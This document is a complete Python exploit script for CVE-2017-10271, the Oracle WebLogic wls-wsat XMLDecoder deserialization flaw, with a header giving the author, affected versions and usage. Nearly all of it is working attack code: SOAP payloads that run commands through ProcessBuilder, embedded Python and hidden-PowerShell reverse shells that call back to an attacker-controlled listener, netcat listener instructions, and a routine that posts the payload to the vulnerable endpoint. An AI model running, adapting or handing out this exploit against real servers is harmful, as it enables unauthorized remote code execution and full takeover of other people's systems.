# -*- coding: utf-8 -*-
# Exploit Title: Weblogic wls-wsat Component Deserialization RCE
# Date Authored: Jan 3, 2018
# Date Announced: 10/19/2017
# Exploit Author: Kevin Kirsche (d3c3pt10n)
# Exploit Github: https://github.com/kkirsche/CVE-2017-10271
#     Exploit is based off of POC by Luffin from Github
#     https://github.com/Luffin/CVE-2017-10271
# Vendor Homepage: http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html
# Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
# Tested on: Oracle WebLogic 10.3.6.0.0 running on Oracle Linux 6.8 and Ubuntu 14.04.4 LTS
# CVE: CVE-2017-10271
# Usage: python exploit.py -l 10.10.10.10 -p 4444 -r http://will.bepwned.com:7001/
#   (Python 3) Example check listener: python3 -m http.server 4444
#   (Python 2) Example check listener: python -m SimpleHTTPServer 4444
#   (Netcat) Example exploit listener: nc -nlvp 4444
 
from sys import exit
from requests import post
from argparse import ArgumentParser
from random import choice
from string import ascii_uppercase, ascii_lowercase, digits
from xml.sax.saxutils import escape
 
class Exploit:
 
    def __init__(self, check, rhost, lhost, lport, windows):
        self.url = rhost if not rhost.endswith(&#039;/&#039;) else rhost.strip(&#039;/&#039;)
        self.lhost = lhost
        self.lport = lport
        self.check = check
        if windows:
            self.target = &#039;win&#039;
        else:
            self.target = &#039;unix&#039;
 
        if self.target == &#039;unix&#039;:
            # Unix reverse shell
            # You should also be able to instead use something from MSFVenom. E.g.
            # msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444
            self.cmd_payload = (
                "python -c &#039;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."
                "SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2("
                "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);&#039;"
            ).format(lhost=self.lhost, lport=self.lport)
        else:
            # Windows reverse shell
            # Based on msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4444
            self.cmd_payload = (
                r"powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) "
                r"{$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#039;" + self.lhost +""
                r"&#039;;$p=&#039;"+ self.lport + "&#039;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a"
                r",$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"
                r"$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#039;cmd.exe&#039;;"
                r"$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"
                r"$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"
                r"$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"
                r"while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};"
                r"$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;"
                r"while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0)"
                r" -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;"
                r"if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};"
                r"if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if "
                r"($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne"
                r" -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=&#039;&#039;}};$s.Write($e."
                r"GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};"
            )
        self.cmd_payload = escape(self.cmd_payload)
 
    def cmd_base(self):
        if self.target == &#039;win&#039;:
            return &#039;cmd&#039;
        return &#039;/bin/sh&#039;
 
    def cmd_opt(self):
        if self.target == &#039;win&#039;:
            return &#039;/c&#039;
        return &#039;-c&#039;
 
 
    def get_generic_check_payload(self):
        random_uri = &#039;&#039;.join(
            choice(ascii_uppercase + ascii_lowercase + digits)
            for _ in range(16))
        generic_check_payload = &#039;&#039;&#039;<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <object id="url" class="java.net.URL">
          <string>http://{lhost}:{lport}/{random_uri}</string>
        </object>
        <object idref="url">
          <void id="stream" method = "openStream" />
        </object>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
&#039;&#039;&#039;
 
        return generic_check_payload.format(
            lhost=self.lhost, lport=self.lport, random_uri=random_uri)
 
    def get_process_builder_payload(self):
        process_builder_payload = &#039;&#039;&#039;<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>{cmd_base}</string>
            </void>
            <void index="1">
              <string>{cmd_opt}</string>
            </void>
            <void index="2">
              <string>{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
&#039;&#039;&#039;
        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),
                                      cmd_payload=self.cmd_payload)
 
    def print_banner(self):
        print("=" * 80)
        print("CVE-2017-10271 RCE Exploit")
        print("written by: Kevin Kirsche (d3c3pt10n)")
        print("Remote Target: {rhost}".format(rhost=self.url))
        print("Shell Listener: {lhost}:{lport}".format(
            lhost=self.lhost, lport=self.lport))
        print("=" * 80)
 
    def post_exploit(self, data):
        headers = {
            "Content-Type":
            "text/xml;charset=UTF-8",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        }
        payload = "/wls-wsat/CoordinatorPortType"
 
        vulnurl = self.url + payload
        try:
            req = post(
                vulnurl, data=data, headers=headers, timeout=10, verify=False)
            if self.check:
                print("[*] Did you get an HTTP GET request back?")
            else:
                print("[*] Did you get a shell back?")
        except Exception as e:
            print(&#039;[!] Connection Error&#039;)
            print(e)
 
    def run(self):
        self.print_banner()
        if self.check:
            print(&#039;[+] Generating generic check payload&#039;)
            payload = self.get_generic_check_payload()
        else:
            print(&#039;[+] Generating execution payload&#039;)
            payload = self.get_process_builder_payload()
        print(&#039;[*] Generated:&#039;)
        print(payload)
        if self.check:
            print(&#039;[+] Running generic check payload&#039;)
        else:
            print(&#039;[+] Running {target} execute payload&#039;).format(target=self.target)
 
        self.post_exploit(data=payload)
 
 
if __name__ == "__main__":
    parser = ArgumentParser(
        description=
        &#039;CVE-2017-10271 Oracle WebLogic Server WLS Security exploit. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0.&#039;
    )
    parser.add_argument(
        &#039;-l&#039;,
        &#039;--lhost&#039;,
        required=True,
        dest=&#039;lhost&#039;,
        nargs=&#039;?&#039;,
        help=&#039;The listening host that the remote server should connect back to&#039;)
    parser.add_argument(
        &#039;-p&#039;,
        &#039;--lport&#039;,
        required=True,
        dest=&#039;lport&#039;,
        nargs=&#039;?&#039;,
        help=&#039;The listening port that the remote server should connect back to&#039;)
    parser.add_argument(
        &#039;-r&#039;,
        &#039;--rhost&#039;,
        required=True,
        dest=&#039;rhost&#039;,
        nargs=&#039;?&#039;,
        help=&#039;The remote host base URL that we should send the exploit to&#039;)
    parser.add_argument(
        &#039;-c&#039;,
        &#039;--check&#039;,
        dest=&#039;check&#039;,
        action=&#039;store_true&#039;,
        help=
        &#039;Execute a check using HTTP to see if the host is vulnerable. This will cause the host to issue an HTTP request. This is a generic check.&#039;
    )
    parser.add_argument(
        &#039;-w&#039;,
        &#039;--win&#039;,
        dest=&#039;windows&#039;,
        action=&#039;store_true&#039;,
        help=
        &#039;Use the windows cmd payload instead of unix payload (execute mode only).&#039;
    )
 
    args = parser.parse_args()
 
    exploit = Exploit(
        check=args.check, rhost=args.rhost, lhost=args.lhost, lport=args.lport,
        windows=args.windows)
    exploit.run()

